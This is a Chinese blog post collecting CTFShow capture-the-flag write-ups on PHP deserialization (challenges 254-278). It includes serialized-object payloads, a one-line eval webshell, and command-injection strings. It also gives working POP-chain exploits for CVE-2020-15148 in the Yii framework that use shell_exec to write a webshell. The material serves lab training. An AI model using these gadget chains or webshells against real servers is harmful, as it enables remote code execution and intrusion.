---
title: CTFShow Web入门 PHP反序列化 Writeup 合集
description: 整理自 web254 ~ web278
date: 2026-06-16 08:59:34
updated: 2026-06-16 08:59:34
image: /2026/CTFShow Web入门 PHP反序列化 Writeup 合集/cover.jpg
categories: [CTF]
---

## web254

简单的逻辑验证，只需要账号密码为 `xxxxxx` 即可，直接用 GET 传参。

**flag**: `ctfshow{0148479c-c0d7-410f-ad8d-09d1359f918d}`

------

## web255

从 cookie 中获取 user，然后反序列化，再通过 `login`、`checkVip` 函数判断。只需生成一个 `isVip` 为 `true` 的对象序列化字符串。

```php
<?php
class ctfShowUser{
    public $isVip;
    public $username='xxxxxx';
    public $password='xxxxxx';
}
$a = new ctfShowUser();
$a->isVip = true;
echo urlencode(serialize($a));
?>
```

**flag**: `ctfshow{e6be0932-e4b6-4048-945e-439329770917}`

------

## web256

在上一题的基础上加了一个判断，要求反序列化后的 `username` 和 `password` 不相等。

```php
<?php
class ctfShowUser{
    public $isVip;
    public $username='xxxxxx';
    public $password='xxxxx';
}
$a = new ctfShowUser();
$a->isVip = true;
echo urlencode(serialize($a));
?>
```

**flag**: `ctfshow{cc7c465f-5f0a-4c41-acdb-8cfe5bd6ceab}`

------

## web257

只需修改 `class` 值为 `backDoor`，触发 `__destruct` 魔术方法，从而调用 `getinfo` 函数，进行 RCE。

```php
<?php
class backDoor{
    private $code="system('cat flag.php');";

}
class ctfShowUser
{

    private $class;
    public function __construct(){
        $this->class= new backDoor();
    }
}
$c = new ctfShowUser();
echo urlencode(serialize($c));
```

**flag**: `ctfshow{e33eafd5-3718-4e1c-abe4-2336cbdf8700}`

------

## web258

在上一道基础上加了正则，可以用 `O:+` 绕过。注意这道题成员属性都是 `public`。

```php
<?php
class backDoor{
    public $code="system('cat flag.php');";
}
class ctfShowUser
{
    public $class;
    public function __construct(){
        $this->class= new backDoor();
    }
}
$c = new ctfShowUser();
$a = serialize($c);
$a=str_replace("O:","O:+",$a);
echo urlencode($a);
```

**flag**: `ctfshow{9ce14fde-41cc-4301-8097-d78af496d7bc}`

------

## web259

（暂无 wp）

------

## web260

不理解什么意义，直接传参。

**flag**: `ctfshow{61966581-87eb-49dd-b440-501855c26f7c}`

------

## web261

如果类中同时定义了 `__unserialize()` 和 `__wakeup()` 两个魔术方法，则只有 `__unserialize()` 方法会生效，`__wakeup()` 方法会被忽略。

利用 `file_put_contents` 函数。因为是弱比较，发现：

```php
<?php
var_dump(0x36d == "877.php");  // true
?>
```

```php
<?php
class ctfshowvip{
    public $username;
    public $password;
}
$a = new ctfshowvip();
$a->username = '877.php';
$a->password = '<?php eval($_GET[1]);?>';
echo urlencode(serialize($a));
?>
```

然后访问 `877.php?1=system('cat /flag_is_here');`

**flag**: `ctfshow{90103421-62cf-46f3-8519-7f3b8858da69}`

------

## web262

字符串逃逸增多，逃逸了 27 个字符，只需 fuck 27 次。

```
f=s&m=s&t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}
```

**flag**: `ctfshow{353f6df8-1fa5-47ba-ac90-5d09fbbc7f75}`

------

## web263

访问 `www.zip` 获取源码。

------

## web264

和 web262 一样，用字符串逃逸，另外访问 `message.php` 时加上 cookie。

```
f=s&m=s&t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}
```

**flag**: `ctfshow{e659f098-7102-4c3c-bf0f-11038cf02d99}`

------

## web265

使用引用 `&`。

```php
<?php
class ctfshowAdmin{
    public $token;
    public $password;
}
$a = new ctfshowAdmin();
$a->token = &$a->password;
echo urlencode(serialize($a));
?>
```

**flag**: `ctfshow{a4ad29b0-b250-414b-8e18-d5cbe006f69c}`

------

## web266

需要构造一个 `ctfshow` 类触发 `__destruct` 魔术方法，输出 flag。通过大小写绕过正则。

```php
<?php
class Ctfshow{
}
$a = new Ctfshow();
echo serialize($a);
?>
```

**flag**: `ctfshow{6479dadd-1745-491d-a222-7f46432c04a4}`

------

## web267

查看源码发现是 Yii 框架，用 `admin/admin` 登录，进入 about 页面，查看源码发现 `<!--?view-source -->` 提示，用 GET 传参后出现：

```php
///backdoor/shell
unserialize(base64_decode($_GET['code']))
```

根据 CVE-2020-15148，直接用已有的 POP 链打。这里的路由已经提示是 `backdoor/shell`，所以直接传 `code`。

```php
<?php
namespace yii\rest{
    class IndexAction
    {
        public $checkAccess;
        public $id;
        public function __construct(){
            $this->checkAccess = 'phpinfo';
            $this->id = '1';            //命令执行
        }
    }
}
namespace Faker {
    use yii\rest\IndexAction;
    class Generator
    {
        protected $formatters;
        public function __construct()
        {
            $this->formatters['close'] = [new IndexAction(), 'run'];
        }
    }
}
namespace yii\db{
    use Faker\Generator;
    class BatchQueryResult
    {
        private $_dataReader;
        public function __construct()
        {
            $this->_dataReader=new Generator();
        }
    }
}
namespace{
    use yii\db\BatchQueryResult;
    echo base64_encode(serialize(new BatchQueryResult()));
}
```

有的函数没回显，选择写入 shell，然后访问 `1.php`，用 POST 传参即可。

```php
$this->checkAccess = 'shell_exec';
$this->id = 'echo "<?php eval(\$_POST[1]);phpinfo();?>" > /var/www/html/basic/web/1.php';
```

**flag**: `ctfshow{d0518711-8913-429e-8191-457e123ce63c}`

------

## web268

上条被过滤了，换一条 POP 链。

```php
<?php
namespace yii\rest {
    class Action
    {
        public $checkAccess;
    }
    class IndexAction
    {
        public function __construct($func, $param)
        {
            $this->checkAccess = $func;
            $this->id = $param;
        }
    }
}
namespace yii\web {
    abstract class MultiFieldSession
    {
        public $writeCallback;
    }
    class DbSession extends MultiFieldSession
    {
        public function __construct($func, $param)
        {
            $this->writeCallback = [new \yii\rest\IndexAction($func, $param), "run"];
        }
    }
}
namespace yii\db {
    use yii\base\BaseObject;
    class BatchQueryResult
    {
        private $_dataReader;
        public function __construct($func, $param)
        {
            $this->_dataReader = new \yii\web\DbSession($func, $param);
        }
    }
}
namespace {
    $exp = new \yii\db\BatchQueryResult('shell_exec', "echo '<?php eval(\$_POST[1]);phpinfo();?>' > /var/www/html/basic/web/1.php");
    echo(base64_encode(serialize($exp)));
}
```

**flag**: `ctfshow{9a563a63-37ae-4e9a-b2ba-8b5783a9a336}`

------

## web269

268 的链子就能用。

**flag**: `ctfshow{bdb360ee-84cc-4495-aeef-d379ff1f113e}`

------

## web270

268 的链子就能用。

**flag**: `ctfshow{7a947d40-fed5-41e9-aec5-32a5b8cf2aff}`

------

## web271

（暂无 wp）

------

## web272

（暂无 wp）

------

## web273

（暂无 wp）

------

## web274

（暂无 wp）

------

## web275

需要 `checkevil()` 为 `true`，不进入 `if` 语句，利用 `system` 进行 RCE。再加一个 `;` 隔断 `rm`。

**payload**: `?fn=php;tac flag.php`

**flag**: `ctfshow{bfb60e1a-c706-4c17-bfdc-516b1a7fad8c}`

------

## web276

（暂无 wp）

------

## web277

（暂无 wp）

------

## web278

（暂无 wp）